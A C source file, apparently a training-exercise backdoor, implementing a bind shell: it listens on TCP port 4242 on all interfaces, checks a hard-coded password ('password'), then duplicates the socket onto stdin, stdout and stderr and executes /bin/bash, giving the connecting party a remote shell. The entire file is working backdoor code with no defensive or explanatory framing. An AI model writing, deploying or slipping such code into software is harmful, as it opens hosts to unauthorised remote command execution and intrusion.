#include "mem.h"
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define PWD "password"

ssize_t
read_line(const int client_fd, char *const buf, size_t max_len) {
    size_t read_bytes;
    char c = 0;

    for (read_bytes = 0; read_bytes < max_len; ++read_bytes) {
        ssize_t recv_res = recv(client_fd, &c, 1, 0);
        if (recv_res == -1) {
            fprintf(stderr, "recv error (fd %d): %s\n", client_fd, strerror(errno));
            return -1;
        } else if (recv_res == 0) {
            fprintf(stderr, "recv error (fd %d): Connection closed while reading\n", client_fd);
            return 0;
        }

        if (c == '\n') {
            break;
        }
        if (c != '\r') {
            buf[read_bytes] = c;
        }
    }

    buf[read_bytes] = '\0';
    return read_bytes;
}

int
main(__attribute__((unused)) int ac, __attribute__((unused)) char **av, char **env) {
    int server_fd = -1, client_fd = -1;
    const struct sockaddr_in address = {.sin_family = AF_INET, .sin_addr.s_addr = INADDR_ANY, .sin_port = htons(4242)};

    server_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) == -1) {
        fprintf(stderr, "Error binding to fd %d: %s", server_fd, strerror(errno));
        goto server_error;
        return 1;
    }
    if (listen(server_fd, 1) == -1) {
        fprintf(stderr, "Error listening on server fd fd %d: %s", server_fd, strerror(errno));
        goto server_error;
        return 1;
    }

    if ((client_fd = accept(server_fd, NULL, NULL)) == -1) {
        fprintf(stderr, "Error accepting client: %s\n", strerror(errno));
        goto server_error;
        return 1;
    }

    while (1) {
        char buf[sizeof(PWD) + 1] = {0};
        if (read_line(client_fd, buf, sizeof(buf)) <= 0) {
            goto client_error;
            return 1;
        }

        if (!ft_memcmp(PWD, buf, sizeof(PWD))) {
            break;
        }

        // drain buffer until empty
        char discard[1024];
        while (recv(client_fd, discard, sizeof(discard), MSG_DONTWAIT) > 0)
            ;

        send(client_fd, "Invalid password, try again\n", 28, 0);
    }

    if (dup2(client_fd, 0) == -1) {
        fprintf(stderr, "Error duplicating stdin to client fd %d: %s\n", client_fd, strerror(errno));
        goto client_error;
        return 1;
    }
    if (dup2(client_fd, 1) == -1) {
        fprintf(stderr, "Error duplicating stdout to client fd %d: %s\n", client_fd, strerror(errno));
        goto client_error;
        return 1;
    }
    if (dup2(client_fd, 2) == -1) {
        fprintf(stderr, "Error duplicating stderr to client fd %d: %s\n", client_fd, strerror(errno));
        goto client_error;
        return 1;
    }

    const char *bash_exec_path = "/bin/bash";
    const char *args[2] = {bash_exec_path, NULL};

    execve(bash_exec_path, (char *const *)args, env);
    fprintf(stderr, "Could not execute %s: %s\n", bash_exec_path, strerror(errno));

    return 0;

client_error:
    close(client_fd);
server_error:
    close(server_fd);

    return 1;
}
